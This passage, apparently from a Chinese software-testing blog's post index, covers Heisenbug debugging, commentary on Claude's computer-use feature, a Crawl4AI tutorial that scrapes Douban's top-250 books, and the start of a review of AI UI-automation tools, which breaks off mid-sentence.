假设你已经在上述大多数领域都有所涉猎，但仍然感到困惑。\n那么如何继续成长呢？\n首先，恭喜你！🎊\n我相信你已经进入了一个拥有这些全面经验的精英群体。\n那么，\n软件工程是一个庞大的领域。\n如果垂直成长遇到了瓶颈，你可以考虑横向发展，转向不同的技能领域，比如开发工程师、产品经理、数据科学家、AI/ML 工程师等。\n正如你所见，这个世界没有终点，总有无尽的挑战在等待着你，同时也伴随着丰厚的回报。\n你能做的就是：\n努力工作，享受乐趣，创造历史\n这是亚马逊的座右铭，也是总结这篇博客的绝佳方式。\n继续为你的客户提供卓越的价值，因为这才是真正重要的。\n如果你的公司做得好，你也会做得好，你周围的领导也会很乐意分享更多的责任。\n成长会自然而然地发生。\n去努力吧，干得漂亮！\n","date":"2024-11-08T09:07:53+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E9%A2%86%E5%9F%9F%E8%BF%98%E6%9C%89%E5%8F%91%E5%B1%95%E7%A9%BA%E9%97%B4%E5%90%97/","title":"测试领域还有发展空间吗？"},{"content":"看到一篇讨论如何处理难以复现的 bug 的文章，这应该是面试里会被问到的问题，随手翻译了一下，大家可以酌情参考。\n转瞬即逝:什么是海森堡 bug? 你是否遇到过一种似乎违背逻辑、难以复现的缺陷？\n如果你的答案是\u0026quot;是的\u0026quot;,请放心,你并不孤单。\n这类缺陷往往在看似随机的条件下发生,这意味着我们无法确定重现问题所需的具体步骤。通常,我们能得到的唯一信息可能是一些模糊的描述,比如\u0026quot;我在执行某个特定流程时遇到了这个问题,但之后就再也无法重现了。\u0026quot;\n正因如此,这些问题通常被称为\u0026quot;不可重现的缺陷\u0026quot;,或者就像我最近发现的,被称为\u0026quot;海森堡 bug\u0026quot;。海森堡 bug 的一个显著特征是,任何试图观察或调试问题的行为都可能改变应用程序代码的行为。仅仅是观察问题的行为就会无意中改变问题发生的条件。这一点我们将在下面详细讨论。\n当密切关注反而适得其反:观察者效应 \u0026ldquo;海森堡 bug\u0026quot;这个术语是对著名物理学家维尔纳·海森堡的一个俏皮双关语,他首次提出了量子力学中的观察者效应。\n\u0026ldquo;观察者效应(不要与测不准原理混淆)指的是观察某个情况或现象必然会改变它。观察者效应在物理学中尤为突出,因为观察和不确定性是现代量子力学的基本特征。观察者效应不仅存在于物理学,在社会学、心理学、语言学和计算机科学等领域也广为人知。\u0026rdquo; ——《观察者效应》,IEEE 出版物,K. Baclawski 等人。\n一个简单的例子就是检查轮胎气压。仅仅是将气压表连接到气门上,就几乎必然会损失一些空气。所以,单纯尝试读取轮胎气压的行为就会改变轮胎的实际气压。\n考虑到这一点,我们可以推断,仅仅是尝试重现缺陷的过程就可能足以改变代码的行为,使得缺陷不再出现。\n海森堡 bug 的一个例子:同步失败的故事 同步缺陷是如何产生的 想象我们需要测试一个使用多线程的应用程序。多线程是一种执行方法,允许在一个进程中创建多个线程。每个线程都独立执行,但与其他线程共享进程资源。构建这样的应用程序需要细致的编程,以避免可能出现的问题,如竞态条件和死锁。\n在应用程序代码中,开发人员创建了一个修改共享计数器变量的函数。理想情况下,开发人员会使用同步机制来确保每个线程在继续执行之前都达到与其他线程相关的已知操作点。然而,如果没有实现同步机制,两个线程就可能同时修改共享计数器。\n简单来说就是:\n我们有一个初始值为'0\u0026rsquo;的计数器变量。线程一将计数器变量更新为'1\u0026rsquo;,同时线程二将计数器变量更新为'2\u0026rsquo;。\n那么正确的值是多少？\n在这种情况下,根本无法确定,这很可能导致应用程序出现不可预测的行为。\n观察者效应的实际表现 调试这样的问题可能异常困难。通过添加打印语句、日志记录或使用调试器,线程的时序可能会发生足够大的变化,使得竞态条件的出现概率大大降低。这就给人一种缺陷消失的错觉。\n像这样的不可重现缺陷或\u0026quot;海森堡 bug\u0026quot;可能会让开发人员和测试人员头疼不已,因为它们经常出其不意地出现,又消失得无影无踪。这些缺陷的本质特征使得它们极难诊断、记录和修复,可能导致开发人员和测试人员之间的挫折感。\n打破\u0026quot;在我的机器上能用\u0026hellip;\u0026ldquo;的论调 处理那些我们无法可靠重现的隐蔽缺陷可能是软件开发中最具挑战性的方面之一。这些问题不仅需要技术专长,还需要团队成员之间的紧密合作和清晰的沟通。所有团队成员都必须以开放的心态来处理这些问题,认识到仅仅因为问题在一个环境中没有出现,并不意味着它在另一个环境中就不存在。\n用随意的\u0026quot;在我的机器上能用\u0026quot;的心态来否定问题,这种做法会破坏寻找解决方案和提高项目整体质量所需的协作精神。相反,这些挑战应该被视为加深理解、加强合作和构建更具弹性系统的机会。\n软件团队该怎么办？ 不可重现的缺陷可能源于各种因素,包括罕见的时序条件、特定的硬件或软件配置,或软件内部的复杂交互。理解和修复这些缺陷需要敏锐的洞察力、系统的方法和大量的耐心。每次尝试调试问题都可能感觉像是徒劳无功,但耐心和沟通是关键。\n如果缺陷仍然无法重现,我们该怎么办呢？\n作为团队理解缺陷的上下文 \u0026quot;上下文:事情发生的情况,有助于你理解它。\u0026quot; - 牛津学习词典\n所有提出的缺陷都需要对上下文有深入和广泛的理解。上下文包括各种因素,如软件运行的环境、发现缺陷时的具体条件,以及导致问题的操作序列。没有这些信息,就很难把握缺陷的全部影响,这可能会显著改变对其风险和影响的认知。\n以下是一些可能有助于确定是否应该继续调试不可重现缺陷的考虑因素：\n评估潜在影响 评估缺陷的潜在严重性。如果缺陷可能导致数据丢失、安全漏洞或重大用户中断,即使很难重现也可能值得进一步调查。 考虑缺陷可能发生的频率。一个罕见但灾难性的缺陷可能仍然值得深入调查,而一个罕见且轻微的问题可能不值得。 评估继续调查的投资回报 评估尝试重现缺陷所消耗的时间和资源。如果付出的努力与潜在影响不成比例,可能就不值得继续追究。 考虑如果团队专注于重现单个缺陷,可能会忽视或延迟哪些其他工作或改进。有时候,关注已知的、可重现的问题或新功能可能是更好的时间利用方式。 收集所有可用信息 确保缺陷详情得到记录并传达给团队。这应该包括预期与实际行为的对比、问题出现的位置、环境信息(如软件版本、操作系统、硬件和配置)、发生频率以及任何其他相关信息。 检查是否有足够的日志、错误报告或遥测数据。如果信息太少或没有信息,可能很难取得进展。如上所述,这些缺陷并不总是能获得统计数据和信息,因此团队不应该仅仅依赖日志提供的信息。 有时最终用户可以提供有助于重现问题的宝贵见解或模式。如果有持续的用户报告,可能值得进一步调查。 向组织内外的其他人寻求建议。你可能不是唯一遇到这个问题的人。在网上研究,与组织内的其他团队交流,检查在线缺陷报告(例如 GitHub issues)。你可能会在第三方包和开源软件的代码库中找到关于这个问题的好文档以及如何重现它。 监控系统并减轻缺陷的潜在影响 是否可以实施一个变通方案或保护措施来最小化缺陷的潜在影响？例如,如果你在代码中使用了第三方包,而缺陷存在于这个包中,你能否使用一个完全不同的包来解决问题？这样就消除了进一步调查的需要。 设置监控以捕获更详细的数据,以备缺陷再次出现时使用。这可能为未来的调查提供线索。 考虑创建自动化脚本来监视特定的词或对象,并计划它们在一天中定期运行。这样做可能有助于深入了解导致缺陷发生的原因。它还可能突显出问题是否在特定时间发生。这些信息随后可以与后台触发的其他服务和操作(例如备份或防病毒更新)相关联。 协调团队和利益相关者的优先级 考虑如果缺陷后续在生产环境中出现是否会对用户或利益相关者体验造成损害。如果缺陷对用户或业务利益相关者来说是高优先级的,可能值得继续努力。 确保团队充分了解情况,并与他们合作决定是否继续调查。有时一个全新的视角可能会带来不同。 总结:尝试找出海森堡 bug 的根本原因是否值得？ 关于是否应该花更多时间调查海森堡 bug 的决策过程应该是一项协作努力,涉及所有相关利益相关者,包括开发人员、QA 工程师、产品经理,甚至在适当的情况下包括最终用户。这确保了各种观点都得到考虑,从而做出更明智和平衡的决定。此外,采用一种视每个缺陷(即使是那些难以重现的缺陷)为加强团队调试实践机会的心态,可以带来软件质量的长期改进。\n最终,是否继续或停止调查的选择应该在风险、用户体验和资源效率之间取得平衡。应对这些挑战不仅仅是为了解决眼前的问题,还关系到促进协作努力来改进开发过程,最终产出更有韧性和可靠的软件。\n","date":"2024-11-08T08:58:38+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E5%8E%BB%E5%A4%84%E7%90%86%E9%9A%BE%E4%BB%A5%E5%A4%8D%E7%8E%B0%E7%9A%84bug/","title":"如何去处理难以复现的bug"},{"content":"前几天 Claude 模型更新一个杀手级应用。\n这次最大的更新并不是新模型，而是让 AI 能够直接与计算机互动。\nAnthropic 推出了「computer use」功能：通过 API，让 Claude 像人一样操作电脑，能够查看屏幕、移动光标、点击按钮和输入文字。换句话说，Claude 现在可以使用标准的计算机工具和软件。这对于开发者来说是个福音，他们可以借此减少枯燥的重复性工作，甚至让 Claude 执行一些开放式任务。\n为了实现这一功能，Anthropic 通过 API 让 Claude 能够感知并操作电脑界面。开发者可以通过这个 API，将用户的指令（例如：「使用电脑上的数据并结合网上信息填写表格」）转化为计算机的操作步骤（如打开表格、浏览器，并自动填写数据）。\n目前，部分公司已经开始应用该功能。例如，Replit 正在利用 Claude 3.5 Sonnet 的计算机操作能力，为其智能体项目开发关键功能，用于应用评估。\n尽管如此，这种技术并非全新。在此之前，Asana、Canva、DoorDash 等公司已经在尝试用 AI 处理复杂、多步骤的任务。\n现实中的挑战 尽管「computer use」功能颇具潜力，但目前仍处于测试阶段。官方也承认，操作速度较慢且容易出错。一些对人类来说非常简单的操作，如拖动、缩放和滚动，对 Claude 来说仍有难度。\n在功能演示时也出现了一些问题，比如 Claude 不小心中断了一次长时间屏幕录制，导致录制内容丢失；另一段时间，它开始浏览黄石国家公园的照片。\n由于 Claude 通过截图理解屏幕内容，它有时无法捕捉到屏幕上瞬时出现的动态元素或弹出窗口。\nAnthropic 希望通过提前发布测试版来获取开发者的反馈，并表示随着时间推移，这一功能将不断优化。\nAnthropic 的开发者关系负责人 Alex Albert 分享了一个趣事：在测试「computer use」功能时，团队决定让 Claude 通过 DoorDash 下单订餐。经过一番分析，Claude 最终成功订购了披萨。\n「computer use」功能限制： 无法创建社交媒体账户 无法发送邮件或消息 无法在社交媒体发布内容 无法完成购物 无法访问私人信息 无法处理验证码 无法生成或编辑图片 无法拨打电话 无法访问受限内容 无法进行需要身份验证的操作 可以看出来当前 claude 的自动化能力比较有限，但表现出来的推理能力及思考能力还是非常让人印象深刻的。\n可以想象到，以后ai 驱动的自动化操作可能是大势所趋。\n思考 1:RPA 的未来形态 目前 ai 遇到的困境是真正实用的杀手级应用其实不多，尽管 ai 在工作中的渗透率已经越来越高，比如飞书里就有自动进行会议纪要的功能，然而这些类似的功能其实都不是必须的，并不能直接转换成生产力。\n而 ai 操作电脑进行自动化操作则在生产力方面给了大家很大的想象空间。\n最简单可以想到的就是 RPA，这个之前也介绍过，通过 RPA 机器人代替人工的重复性工作，以提升生产力及操作的准确率。\n目前 RPA 提供了一组通用的操作能力，比如操作网页，操作原声应用等，RPA 的用户可以通过事先编排好的脚本或者流程完成一些简单或相对复杂一点的机械化操作。比如电商领域自动群发消息，自动点击发货等。\nRPA 目前遇到的比较大的挑战是使用门槛。\n通用型的简单操作可能实施起来比较容易，但是一些具体的定制化流程和行为还是有一定的开发门槛的。\n而 computer use 这个功能则给出解决这一问题的思路：用自然语言去描述业务需求以及行为，让 ai 自己来思考解决问题的方案，最后通过 ai 自行操作电脑来解决问题。\n这就是超级 RPA，应该也是今后 RPA 可以发力的方向。\n思考 2: AI 取代人类？ ai 会使用电脑了，而且以后可能会使用的更快更好。\n这是不是意味着 AI 可以取代人类呢？\n我觉得短期内这一天应该不会带来。\n使用 AI 代替人类进行重复性的工作并不代表 AI 可以完全取代人类，相反，这反而是 AI 可以更好的服务人类的最好证明。\n从本质上讲，把重复性的工作交给机器去做其实是人类从工业革命以来一直在进行实践，也是推动人类社会不停进步的一个重要因素。\n举一个例子，用电力驱动的路灯出现之后，之前给点油的路灯换油的工人都失业了。\n这不能说明电灯替代了人类，只能说明电灯替换了油灯，并降低了人工的维护成本。\n技术转型确实发生了，但并非所有工人都直接失业。许多工人实际上转型到了新兴的电力相关行业。\n新技术的出现实际上创造了更多的就业机会。电力行业需要大量的工程师、技术人员和维护人员。\n同样的道理，AI 并不会完全的取代人类，，尽管会替代一些现有工作，但同时也会创造新的就业形态和职业。\n思考 3: AI 什么时候会变得更有用？ 当今的 AI 生态百花齐放，然而杀手级的应用却不是很多。\n这也是一些人认为 AI 泡沫会破灭的重要理由。\n不可否认，让 AI 去操作电脑，确实使得 AI 的生产力得到了巨大的提升。\n然而这后面的本质其实是模型推理能力以及多模态能力的进步。\n我猜这里应该存在一个临界点，当大模型的推理能力和多模态能力突破这个临界点之后，AI 的生产力会得到巨大的提升。\n这个临界点可能并不是一蹴而就的，而是一个渐进的过程。\n当 AI 的推理能力达到足以理解复杂场景、准确把握上下文、并能灵活调用各种工具和能力时，我们或许就能看到真正颠覆性的生产力革命。\n目前 AI 差的不是临门一脚，我们可能还是需要一定的耐心。\n但资本会一直保持耐心吗？\n","date":"2024-10-25T09:27:39+08:00","permalink":"zh.ethanhan.cc/p/ai%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%8F%88%E8%B6%9F%E5%87%BA%E4%B8%80%E6%9D%A1%E6%96%B0%E8%B7%AF%E4%BA%86claude-%E6%A8%A1%E5%9E%8B%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%94%B5%E8%84%91%E4%BA%86/","title":"AI自动化测试又趟出一条新路了？Claude 模型可以直接操作电脑了"},{"content":"Crawl4AI应该是近期最火的 AI 爬虫项目了。\n这个项目吸引我的点有 2 个：\n引入了 AI 底层使用的是playwright 核心特性 官方的介绍是这样的。\n🆓 完全免费和开源 🚀 性能极快，超越许多付费服务 🤖 适合大语言模型的输出格式（JSON、清理过的 HTML、markdown） 🌍 支持同时爬取多个 URL 🎨 提取并返回所有媒体标签（图片、音频和视频） 🔗 提取所有外部和内部链接 📚 从页面提取元数据 🔄 用于身份验证、头部和爬取前页面修改的自定义钩子 🕵️ 用户代理自定义 🖼️ 对页面进行截图 📜 爬取前执行多个自定义 JavaScript 📊 使用 JsonCssExtractionStrategy 生成结构化输出，无需大语言模型 📚 多种切片策略：基于主题、正则表达式、句子等 🧠 高级提取策略：余弦聚类、大语言模型等 🎯 支持 CSS 选择器以精确提取数据 📝 传递指令/关键词以优化提取 🔒 支持代理以增强隐私和访问 🔄 会话管理，适用于复杂的多页面爬取场景 🌐 异步架构，提高性能和可扩展性 用的一手好 emoji👍。\n这里面一些传统爬虫所不支持的功能基本上来自于 playwright，比如截图之类的。\n比较有意思是引入了切片策略和使用大预言模型来处理爬取的内容。\n安装 Crawl4AI 的安装相对比较复杂，不过如果不需要深入体验本地大模型的话，使用最基本的安装方式就可以了。\n基本上是 2 条命令。\n1 2 pip install crawl4ai python -m playwright install chromium 这里为了节约时间和空间，只安装了 playwright 的 chrome 浏览器，一般情况下够用了。\n爬豆瓣上评分最高的 250 本书 写了个获取豆瓣评分最高的 250 本图书的爬虫。\n这个爬虫跟大语言模型没有半毛钱关系。\n大概的过程就是访问https://book.douban.com/top250这个页面以及后面的 9 个分页，把每一页的 25 本图书都爬下来。\n拿官方的例子随手改了改，代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import asyncio import json from crawl4ai import AsyncWebCrawler from crawl4ai.extraction_strategy import JsonCssExtractionStrategy from pprint import pprint as pp async def extract_books(): schema = { \u0026#34;name\u0026#34;: \u0026#34;Douban Book 250\u0026#34;, \u0026#34;baseSelector\u0026#34;: \u0026#34;tr.item\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.pl2 \u0026gt; a\u0026#34;, }, { \u0026#34;name\u0026#34;: \u0026#34;url\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;attribute\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.pl2 \u0026gt; a\u0026#34;, \u0026#34;attribute\u0026#34;: \u0026#34;href\u0026#34;, }, { \u0026#34;name\u0026#34;: \u0026#34;info\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.pl\u0026#34;, }, { \u0026#34;name\u0026#34;: \u0026#34;rate\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.rating_nums\u0026#34;, }, { \u0026#34;name\u0026#34;: \u0026#34;quote\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;span.inq\u0026#34;, }, ], } extraction_strategy = JsonCssExtractionStrategy(schema, verbose=True) async with AsyncWebCrawler(verbose=True) as crawler: for i in range(10): result = await crawler.arun( url = f\u0026#34;https://book.douban.com/top250?start={i * 25}\u0026#34;, extraction_strategy=extraction_strategy, bypass_cache=True, ) assert result.success, \u0026#34;Failed to crawl the page\u0026#34; books = json.loads(result.extracted_content) pp(books) print(f\u0026#34;Successfully extracted {len(books)} books\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(extract_books()) 部分结果如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 [{\u0026#39;info\u0026#39;: \u0026#39;[清] 曹雪芹 著 / 人民文学出版社 / 1996-12 / 59.70元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;都云作者痴，谁解其中味？\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.6\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;红楼梦\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1007305/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;余华 / 作家出版社 / 2012-8 / 20.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;生的苦难与伟大\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.4\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;活着\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/4913064/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[英] 乔治·奥威尔 / 刘绍铭 / 北京十月文艺出版社 / 2010-4-1 / 28.00\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;栗树荫下，我出卖你，你出卖我\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.4\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;1984\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/4820710/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;J.K.罗琳 (J.K.Rowling) / 苏农 / 人民文学出版社 / 2008-12-1 / 498.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;从9¾站台开始的旅程\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.7\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;哈利·波特\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/24531956/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;刘慈欣 / 重庆出版社 / 2012-1 / 168.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;地球往事三部曲\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.5\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;三体全集: 地球往事三部曲\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/6518605/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[哥伦比亚] 加西亚·马尔克斯 / 范晔 / 南海出版公司 / 2011-6 / 39.50元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;魔幻现实主义文学代表作\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.3\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;百年孤独\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/6082808/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[美国] 玛格丽特·米切尔 / 李美华 / 译林出版社 / 2000-9 / 40.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;革命时期的爱情，随风而逝\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.3\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;飘\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1068920/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[英] 乔治·奥威尔 / 荣如德 / 上海译文出版社 / 2007-3 / 10.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;太阳底下并无新事\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.3\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;动物农场\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/2035179/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;林奕含 / 北京联合出版公司 / 2018-2 / 45.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;向死而生的文学绝唱\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.2\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;房思琪的初恋乐园\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/27614904/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[明] 罗贯中 / 人民文学出版社 / 1998-05 / 39.50元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;是非成败转头空\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.3\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;三国演义（全二册）\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1019568/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[英] 阿·柯南道尔 / 丁钟华 等 / 群众出版社 / 1981-8 / 53.00元/68.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;名侦探的代名词\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.3\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;福尔摩斯探案全集（上中下）\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1040211/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[日] 东野圭吾 / 刘姿君 / 南海出版公司 / 2013-1-1 / 39.50元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;一宗离奇命案牵出跨度近20年步步惊心的故事\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.2\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;白夜行\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/10554308/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;[法] 圣埃克苏佩里 / 马振骋 / 人民文学出版社 / 2003-8 / 22.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;献给长成了大人的孩子们\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.1\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;小王子\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1084336/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;（丹麦）安徒生 / 叶君健 / 人民文学出版社 / 1997-08 / 25.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;为了争取未来的一代\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.3\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;安徒生童话故事集\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1046209/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;鲁迅 / 人民文学出版社 / 1973-3 / 0.36元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;新文学的第一声呐喊\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.2\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;呐喊\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1449351/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;金庸 / 生活·读书·新知三联书店 / 1994-5 / 96.00元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;有情皆孽，无人不冤\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.2\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;天龙八部\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1255625/\u0026#39;}, {\u0026#39;info\u0026#39;: \u0026#39;三毛 / 哈尔滨出版社 / 2003-8 / 15.80元\u0026#39;, \u0026#39;quote\u0026#39;: \u0026#39;游荡的自由灵魂\u0026#39;, \u0026#39;rate\u0026#39;: \u0026#39;9.2\u0026#39;, \u0026#39;title\u0026#39;: \u0026#39;撒哈拉的故事\u0026#39;, \u0026#39;url\u0026#39;: \u0026#39;https://book.douban.com/subject/1060068/\u0026#39;}, ... ... ] 总结 写这个爬虫大概花了半小时时间，所以这个库上手还是不太困难的。\n然而最基本的使用场景里，ai 完全没有出场的机会。\n后面有时间的话体验再体验一下完全使用 ai 来抓取网页内容的功能吧。\n这次试用我觉得亮点如下：\n使用 playwright，极大的提升了爬虫的可用性和使用场景 默认使用异步的方式使得爬虫的性能非常不错 现在一些站点的前端页面会做 css 混淆，传统的基于 css 选择器的爬虫鞭长莫及，引入 ai 进行内容的爬取非常有必要 不足的地方：\n官方文档关于 ai 使用方法的那几篇，代码格式是乱的，搞得我不好 copy，所以下次再体验吧 JsonCssExtractionStrategy的 schema 没有完整的规格说明，只能靠猜 代码库里跟 llm 相关的例子太少 ","date":"2024-10-17T23:02:15+08:00","permalink":"zh.ethanhan.cc/p/%E5%BF%AB%E9%80%9F%E4%BD%93%E9%AA%8C%E8%BF%91%E6%9C%9F%E6%9C%80%E7%81%AB%E7%9A%84ai%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE-crawl4ai/","title":"快速体验近期最火的AI爬虫项目-Crawl4AI"},{"content":"最近在整理笔记的时候发现之前关注过几款 ai 的自动化测试工具，如今半年过去了，正好可以拿这几款工具来回顾一下 AI 在自动化方向上的进展。\nTaxyAI 这应该是印象中比较早期的 ai 自动化测试工具了。\n该工具的具体形态是 chrome 浏览器的扩展，只要用自然语言输入一个指令，比如给 fred 发一封邮件给，工具就会自动在浏览器端完成操作。\n项目出道即巅峰，从发布之初到现在没有任何进展。\n本质上就是 1 个 demo，可以不用关注太多。\n地址：https://github.com/TaxyAI/browser-extension\nBrowserGPT 这个项目允许你使用自然语言控制浏览器。它将 OpenAI 的 GPT-4 与 Playwright 库集成，实现无缝的浏览器导航。GPT-4 生成代码片段，Playwright 执行这些代码来完成指定任务。\n之前有写过文章讲解这个工具的实现，有兴趣的同学可以翻一下。\n目前该项目的版本还是 1.0，最新的更新记录停留在了 4 个月前，也就是 6 月份。\n更新的内容也只是修改 dev 的 dependent，与功能加强没有什么关系。\n所以该项目现阶段可能也不会有什么进展了，应该也不需要过多的关注。\n项目地址：https://github.com/mayt/BrowserGPT\nUFO UFO：由微软开发的专注于 Windows 操作系统交互的 UI 代理\n它可以通过理解用户的自然语言指令和屏幕的视觉内容，自动执行一系列复杂的任务。\n比如“删除 Word 文档中的所有图片”或“在 PowerPoint 文稿中添加一个新幻灯片”。\n它结合了 GPT 4-V，能够理解和 Windows 应用程序的图形用户界面（GUI）并执行操作。\nUFO 能够在 Windows 应用程序中执行各种操作，如点击按钮、填写表单、浏览文件等，就好像一个人在使用鼠标和键盘操作电脑一样。\n我觉得称之为 AI 赛博牛马。\n该工具由微软出品，背靠大树好乘凉，输出也相对稳定，目前最新的版本是 9 月 8 号发布的 v1.1.0。\n稍微看了一下提交记录，这个项目似乎只有 1 个开发提交代码，协作属性不强，可能微软在这上面投入的资源并不是很多吧。\n谨慎看好，可以关注一波先。\n工作原理 UFO 的工作原理基于先进的视觉语言模型技术，特别是 GPT-Vision，以及一个独特的双代理框架，使其能够理解和执行 Windows 操作系统中的图形用户界面（GUI）任务。以下是 UFO 工作原理的详细解释：\n1、双代理框架\n双代理架构：UFO 由两个主要代理组成，AppAgent 和 ActAgent，分别负责应用程序的选择与切换，以及在这些应用程序内执行具体动作。\n应用程序选择代理（AppAgent）：负责决定为了完成用户请求需要启动或切换到哪个应用程序。它通过分析用户的自然语言指令和当前桌面的屏幕截图来做出选择。一旦确定了最适合的应用程序，AppAgent 会制定一个全局计划来指导任务的执行。\n动作选择代理（ActAgent）：一旦选择了应用程序，ActAgent 就会在该应用程序中执行具体的操作，如点击按钮、输入文本等。ActAgent 利用应用程序的屏幕截图和控件信息来决定下一步最合适的操作，并通过控制交互模块将这些操作转化为对应用程序控件的实际动作。\n2、 控制交互模块\nUFO 的控制交互模块是将代理识别的动作转换为应用程序中实际执行的关键组成部分。这个模块使 UFO 能够直接与应用程序的 GUI 元素进行交互，执行如点击、拖动、文本输入等操作，而无需人工干预。\n3、多模态输入处理\nUFO 